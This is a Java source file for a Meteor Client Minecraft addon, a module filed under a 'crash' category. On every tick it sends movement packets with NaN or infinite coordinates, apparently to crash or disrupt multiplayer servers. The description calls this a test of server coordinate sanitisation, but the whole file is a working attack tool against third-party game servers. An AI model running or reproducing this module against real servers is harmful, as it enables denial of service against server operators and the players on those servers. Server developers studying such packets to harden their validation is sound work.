package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class NanPosition extends Module {
    public enum CoordMode { NAN, POSITIVE_INFINITY, NEGATIVE_INFINITY, NAN_Y_ONLY }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<CoordMode> mode = sgGeneral.add(new EnumSetting.Builder<CoordMode>()
        .name("mode").description("Which IEEE-754 special value to inject.")
        .defaultValue(CoordMode.NAN).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    public NanPosition() {
        super(AddonTemplate.CRASH_CATEGORY, "nan-position",
            "Sends NaN/Infinity coordinates. Tests server IEEE-754 coordinate sanitisation.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        double val = switch (mode.get()) {
            case NAN               -> Double.NaN;
            case POSITIVE_INFINITY -> Double.POSITIVE_INFINITY;
            case NEGATIVE_INFINITY -> Double.NEGATIVE_INFINITY;
            case NAN_Y_ONLY        -> Double.NaN;
        };
        double px = mc.player.getX(), pz = mc.player.getZ();
        double sx = (mode.get() == CoordMode.NAN_Y_ONLY) ? px : val;
        double sy = val;
        double sz = (mode.get() == CoordMode.NAN_Y_ONLY) ? pz : val;
        mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
            sx, sy, sz, mc.player.getYaw(1.0F), mc.player.getPitch(1.0F), false, false));
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
